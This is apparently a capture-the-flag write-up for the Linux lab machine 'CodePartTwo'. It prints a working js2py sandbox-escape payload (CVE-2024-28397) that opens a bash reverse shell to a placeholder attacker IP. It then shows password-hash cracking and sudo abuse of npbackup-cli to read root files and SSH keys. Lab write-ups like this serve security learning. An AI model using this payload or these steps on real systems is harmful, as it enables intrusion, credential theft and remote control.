+++
date = '2026-09-15T14:18:25+02:00'
draft = false
title = 'CodePartTwo Writeup EN'
+++
**Author**: **`joy.scd01`**

**Date**: **`09/10/2025`**

![pwn.png](/images/imgs_code2/pwn.png)

---
# Introduction

**_CodePartTwo_** is an **Easy-level Linux** box that serves as a direct continuation of the original **_Code_** machine, shifting the focus toward source code review and exploiting known vulnerabilities in outdated dependencies.

The exploitation path begins by downloading the web application's source code and identifying a vulnerable version of the **js2py** library. By modifying a public **PoC** for a **sandbox escape** (**CVE-2024-28397**), I achieved **Remote Code Execution** (**RCE**). Lateral movement mirrors the first machine, requiring the enumeration of a local **SQLite** database and hash cracking to pivot to the user **marco**. Finally, Privilege Escalation involves abusing a custom backup binary that allows users to supply a custom configuration file, leading to the extraction of the **root flag** via **arbitrary file reading**.

---
# Techniques Used

- **js2py Sandbox Escape (CVE-2024-28397)**

- **Database Dump**

- **Hash Cracking**

- **Arbitrary File Read via Sudo privilege misconfiguration**

---
# Enumeration

## nmap

Initial scan on all ports:

```bash
nmap -p- code2 
```

```text
PORT      STATE    SERVICE
22/tcp    open     ssh
8000/tcp  open     http-alt
```

Targeted scan with scripts and service detection:

```bash
nmap -sC -sV code2 
```

```text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a0:47:b4:0c:69:67:93:3a:f9:b4:5d:b3:2f:bc:9e:23 (RSA)
|   256 7d:44:3f:f1:b1:e2:bb:3d:91:d5:da:58:0f:51:e5:ad (ECDSA)
|_  256 f1:6b:1d:36:18:06:7a:05:3f:07:57:e1:ef:86:b4:85 (ED25519)
8000/tcp open  http    Gunicorn 20.0.4
|_http-title: Welcome to CodePartTwo
|_http-server-header: gunicorn/20.0.4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Open ports**:

- **22**/tcp - SSH

- **8000**/tcp - Web (Gunicorn)

---
# Initial Access | js2py Sandbox Escape

Browsing to port **8000**, I found the **CodePartTwo** platform hosted. The homepage presented three options: **`LOGIN`**, **`REGISTER`**, and **`DOWNLOAD APP`**.

![web1.png](/images/imgs_code2/web1.png)

I ran a directory scan with **gobuster** in the background, registered a dummy user, and logged in.

![platform.png](/images/imgs_code2/platform.png)

Similar to the first machine, the dashboard featured a **Python/JS** web interpreter. Instead of immediately black-box fuzzing the input, I clicked on **`DOWNLOAD APP`** to shift to a white-box testing approach.

Reviewing the downloaded source code, I found an empty database in:
- **`app/instance`**

![rabbit.png](/images/imgs_code2/rabbit.png)

The **`app.secret_key`** in **`app.py`** (which I noted for later, though it wasn't immediately exploitable).

![code.png](/images/imgs_code2/code.png)

The real breakthrough came from analyzing the **`requirements.txt`** file, which listed the application's dependencies:

![version.png](/images/imgs_code2/version.png)

Seeing **`js2py==0.74`** caught my attention. I analyzed **`app.py`** to see how this specific library was implemented and found the following route:

![js2.png](/images/imgs_code2/js2.png)

The application was taking the user-supplied code directly and passing it into **`js2py.eval_js()`**. Searching online for "**js2py 0.74 sandbox escape**", I immediately found a public repository detailing **`CVE-2024-28397`**.

- https://github.com/Marven11/CVE-2024-28397-js2py-Sandbox-Escape

**Note**: _**`js2py`** is a library intended to execute **JavaScript** securely within a **Python** environment. However, version **`0.74`** is vulnerable to a **sandbox escape**. The vulnerability arises because the library improperly handles **Python** objects and function references exposed to the **JavaScript** context. An attacker can craft malicious **JavaScript** that reaches back into the underlying **Python** interpreter, bypassing the sandbox and executing **arbitrary OS commands**._

I grabbed the payload from the **PoC** (which was originally designed to read **`/etc/passwd`** and pop a calculator) and modified it to execute a standard bash reverse shell.

```javascript
let cmd = "bash -c 'bash -i >& /dev/tcp/<attacker_ip>/22667 0>&1'"
let hacked, bymarve, n11
let getattr, obj

hacked = Object.getOwnPropertyNames({})
bymarve = hacked.__getattribute__
n11 = bymarve("__getattribute__")
obj = n11("__class__").__base__
getattr = obj.__getattribute__

function findpopen(o) {
    let result;
    for(let i in o.__subclasses__()) {
        let item = o.__subclasses__()[i]
        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {
            return item
        }
        if(item.__name__ != "type" && (result = findpopen(item))) {
            return result
        }
    }
}

n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()
console.log(n11)
n11
```

After injecting the modified payload into the web interpreter and setting up a **netcat** listener, I obtained a shell as the user **`app`**.

![initial.jpeg](/images/imgs_code2/initial.jpeg)

---
# Lateral Movement | SQLite to SSH

Inside the target, I enumerated the **`app/instance/`** directory again. Unlike the empty database found in the downloaded source code, the live system contained a populated **`users.db`** file.

Using the **sqlite3** command-line utility, I connected to the database to extract the contents:

```SQL
.tables
select * from user;
```

![db.png](/images/imgs_code2/db.png)

This query returned two password hashes, which I took and cracked using **Crackstation**.

- https://crackstation.net/

![crack.png](/images/imgs_code2/crack.png)

Armed with the valid credentials, I moved laterally and connected via **SSH** as the user **`marco`**.

![userf.png](/images/imgs_code2/userf.png)

---
# Privilege Escalation | Arbitrary File Read via Sudo privilege misconfiguration

Logged in as **`marco`**, I immediately checked for **sudo** privileges:

```bash
sudo -l
```

![sudol.png](/images/imgs_code2/sudol.png)

I could run **`npbackup-cli`** as **root** without a password. In the home directory, I noticed a configuration file named **`npbackup.conf`**.

![home.png](/images/imgs_code2/home.png)

![conf.png](/images/imgs_code2/conf.png)

By observing the script execution, I noticed it performed a check that actively blocked the **`--external-backend-binary`** flag, preventing a direct **OS command injection**.

To understand the intended functionality, I checked the help menu:

```bash
sudo /usr/local/bin/npbackup-cli --help
```

The output revealed several interesting flags:

**`1`**. **-b** : run a backup.

**`2`**. **-f** : force.

**`3`**. **-c** : path to alternative configuration file (defaults to current dir/npbackup.conf).

**`4`**. **--ls**: list the contents of a specified backup archive.

**`5`**. **--dump**: extract and print the contents of a specific file from the backup.

**Note**: _The **`-c`** flag was the critical flaw. Since the script runs as **root**, it will blindly trust and read whichever configuration file we point it to. This meant I could tell the backup utility to target the **`/root`** directory by providing a modified configuration file._

I copied the default configuration, edited it, and changed the target backup path to **`/root`**:

```bash
cp npbackup.conf fall.conf
nano fall.conf # Modified the backup target path to /root
```

![priv1.png](/images/imgs_code2/priv1.png)

Next, I executed the backup process using my malicious configuration file:

```bash
sudo /usr/local/bin/npbackup-cli -b -c fall.conf -f
```

![priv2.png](/images/imgs_code2/priv2.png)

To read the contents of the newly created **root** backup, I used the script's built-in listing and dumping flags:

```bash
sudo /usr/local/bin/npbackup-cli -c fall.conf --ls
sudo /usr/local/bin/npbackup-cli -c fall.conf --dump /root/root.txt
```

![privls.png](/images/imgs_code2/privls.png)

This output the contents of the **root flag** directly to my terminal.

![rootf.png](/images/imgs_code2/rootf.png)

For full persistence and interactive system compromise, the exact same **`--dump`** command can be used to extract the **`/root/.ssh/id_rsa`** private key.

---
# Final Thoughts

**_CodePartTwo_** is a solid follow-up to the original box. It excellently demonstrates the importance of shifting from a black-box mindset to a white-box approach when source code is available. The **js2py CVE** is a great reminder that outdated dependencies are often the easiest way into a system. The privilege escalation accurately models a very common real-world misconfiguration: allowing users to pass arbitrary configuration files to high-privileged binaries.